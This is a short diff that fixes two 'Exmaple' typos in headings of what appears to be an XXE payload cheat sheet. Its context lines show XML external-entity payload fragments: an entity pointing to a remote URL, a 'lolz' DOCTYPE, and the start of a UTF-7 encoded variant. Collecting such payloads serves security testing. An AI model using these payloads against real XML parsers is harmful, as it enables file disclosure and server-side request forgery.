@@ -103,7 +103,7 @@
 <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
 ```
 
-*  XXE: (Remote Attack - Through External Xml Inclusion) Exmaple
+*  XXE: (Remote Attack - Through External Xml Inclusion) Example
 ```
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -111,7 +111,7 @@
 <lolz><lol>3..2..1...&test<lol></lolz>
 ```
 
-* XXE: UTF-7 Exmaple
+* XXE: UTF-7 Example
 ```
 <?xml version="1.0" encoding="UTF-7"?>
 +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
